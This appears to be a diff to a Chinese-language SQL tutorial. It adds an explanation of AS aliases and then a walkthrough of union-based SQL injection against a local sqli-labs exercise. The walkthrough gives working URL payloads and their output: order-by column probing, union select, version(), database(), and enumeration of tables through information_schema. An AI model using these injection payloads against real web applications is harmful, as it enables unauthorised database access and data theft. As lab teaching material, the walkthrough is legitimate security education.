@@ -173,7 +173,37 @@ FROM table2
 
 ### 指定别名 as
 
-...pass
+在 SQL 中，`AS` 关键字用于为列或表指定一个**别名**，以便提高查询的可读性、简洁性，或者对结果集的列名进行自定义，AS 是**可选**的，在很多情况下可以省略，示例如下所示：
+
+1. **为列指定别名**：为查询结果的列定义一个更友好的名字，例如下述 SQL 执行结果中显示的列名将为 student_name 和 student_age，而不是原始的 name 和 age .
+
+   ```sql
+   SELECT name AS student_name, age AS student_age
+   FROM students;
+   ```
+
+   值得注意的是，如果别名包含空格或特殊字符，需要用双引号或方括号括起来（不同数据库有差异）：
+
+   ```sql
+   SELECT name AS "Student Name"
+   FROM students;
+   ```
+
+2. **为表指定别名**：为表名定义别名，用于简化书写，特别是在多表连接时，例如下述 SQL 中可以通过 s 和 c 来简化引用表的操作 .
+
+   ```sql
+   SELECT s.name, c.course_name
+   FROM students AS s
+   JOIN courses AS c
+   ON s.id = c.student_id;
+   ```
+
+3. **为计算列指定别名**：下述 SQL 执行结果中的 total_cost 列表示每条订单的总价，而不是显示计算表达式 .
+
+   ```sql
+   SELECT price * quantity AS total_cost
+   FROM orders;
+   ```
 
 
 
@@ -363,6 +393,77 @@ SELECT ... FROM ... WHERE id = '{id}' ...
 
 接下来我们可以利用 `联合查询注入` 先来查询数据库名，---> 然后根据数据库名查询表名，---> 再然后根据表名查询表字段名，---> 最后根据表名及字段名查询出我们想要的数据！是不是很 Hacker，Let's hack it  now !!!
 
-But，使用联合查询（Union Select）的前提是表的列数是已知的！如何获取表的列表呢？答：使用 `order by` 语句！
+But，使用联合查询（Union Select）的前提是表的列数是已知的！如何获取表的列数呢？答：使用 `order by` 语句！
+
+一. 通过 **穷举法** 我们可得，该表的列数是 `3`，因为当 `order by` 后面的数字大于 3 时，页面会抛出错误信息 : 
+
+```sql
+http://localhost:8001/Less-1/?id=1' order by 3--+ (页面正常)
+```
+
+```sql
+http://localhost:8001/Less-1/?id=1' order by 4--+ (页面抛错: Unknown column '4' in 'order clause')
+```
+
+OK，此时我们就可以使用联合查询来获取我们想要的数据啦！
+
+二. 首先我们先简单学习一下如何使用 `union select`，**值得注意的是这里之所以令 `id=-1`**，是因为只有前半段 Select 查询语句无结果时，后半段 Select 查询语句查询到的数据才有机会显示到页面中（因为经推测可得，页面只显示一行查询到的数据哟～）
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 1,2,3 --+
+```
+
+```
+Your Login name:2
+Your Password:3
+```
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 'user_id_demo','user_name_demo','user_password_demo' --+
+```
+
+```
+Your Login name:user_name_demo
+Your Password:user_password_demo
+```
+
+三. 同理，我们获取一下当前所使用的数据库的版本信息：
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 1,2,version() --+
+```
+
+```
+Your Login name:2
+Your Password:5.5.44-0ubuntu0.14.04.1
+```
+
+四. 同理，我们获取一下当前所使用的数据库的名称：
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 1,2,database() --+
+```
+
+```
+Your Login name:2
+Your Password:security
+```
+
+五. 接着我们结合 `group_concat()` 函数，获取数据库 `security` 中所有的表信息：
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.`tables` where table_schema='security'; --+
+```
+
+上述 SQL 语句也可写成：
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 'user_id_demo','user_name_demo',group_concat(table_name) from information_schema.tables where table_schema='security'; --+
+```
+
+```
+Your Login name:user_name_demo
+Your Password:emails,referers,uagents,users
+```
 
 ...pass
